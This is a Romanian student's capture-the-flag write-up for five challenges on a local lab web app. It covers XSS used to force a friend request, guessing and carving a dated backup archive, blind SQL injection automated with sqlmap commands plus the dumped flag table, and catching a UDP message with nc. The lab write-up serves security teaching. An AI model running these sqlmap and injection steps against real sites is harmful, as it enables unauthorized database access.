## Paiu Teofil 333CB

1. Am intrat cu ajutorul scriptului pe dev-machine unde am scanat reteaua din care facea
parte interfata eth0, am descoperit de acolo adresa serverului, intrat am inspectat paginile
iar pe cea de register am aflat calea către formularul adevarat, mi-am creat cont și 
m-am conectat si am cautat in inspesct element Speish.. iar acolo am găsit primul flag

2. Am folosit xss pentru accepta cererea de prietenia trimisa de mine catre boss, ii trimit lui
nyan un mesaj in care il fac sa ii trimita lui theboss o secventa de cod care ii face sa imi accepte cererea
m-am folosit de hit-urile date in inside/message/view 6 (de unde am concluzionat ca 6 este id-ul lui nyan),
dupa putina cautare am gasit id-ul bosului ca find 1 si am meu 9 ,codul folosit l-am atasat in script.html

3. Am adaugat in path numele fisierului (localhost:8080/backup.sh) si l-am descarcat de pe browser odata 
inspectat am constatat ca exita o arhiva cu numele backup-$DATE.tar.gz unde data este data de azi - [2 - 16]
zile, dupa niste try and error am reusit sa ghicesc numele arhivei si sa o descarc, dupa acesta am folosit 
hexedit pentru a cauta inca un header de tar.gz odata gasit am salvat result arhivei din punctul acela si
am descarcat rezultatul, care dezarhivat rezulta in flag.txt

4. Prin arhiva de backup am vazut intr-un comentariu din controllers message.php ca calea inside/message/nuke/ este
cea exploatabila, am vazut ca aceasta prezinta erori la inputuri precum ' -- .etc si am incercat sa realizez un blind
attack dar dupa ceva vreme in care am incercat sa ghicesc litere, am realizat ca ar fi mai rapid daca as utiliza un script care sa faca asta. Asa ca am folosit sqlmap:
	-  python3 sqlmap.py -u "http://localhost:8080/inside/message/nuke/" --cookie="PHPSESSID=p9ho2iu8ll726i2iiq73k34cem" -tables  --batch
	aceasta comanda mi-a returnat numele si tabelele fiecarui database
	-  python3 sqlmap.py -u "http://localhost:8080/inside/message/nuke/" --cookie="PHPSESSID=p9ho2iu8ll726i2iiq73k34cem" -T flags22900 --batch --dump
	aceasta a inspectat tabelul flags22900

Si rezultat final a fost:

Database: web_3769
Table: flags22900
[1 entry]
+----+----------------------------------------------+
| id | zaflag                                       |
+----+----------------------------------------------+
| 1  | SpeishFlag{JpeRyZlQGKNXjn5UbILXiHbHEbd4Ae8k} |
+----+----------------------------------------------+


5. Am ascultat cu tcpdump si am observat ca statia cu serverul web imi trimite un mesaj pe un port
iar statia mea ii raspunde ca portul respectiv udp este inchis, deci am deschis portul cu nc -ulp si
am primit mesajul ce parea encodat in base64 (egalul de la final la dat de gol usor) inconjurat de NYAN.NYAN....
care era defapt chiar flagul.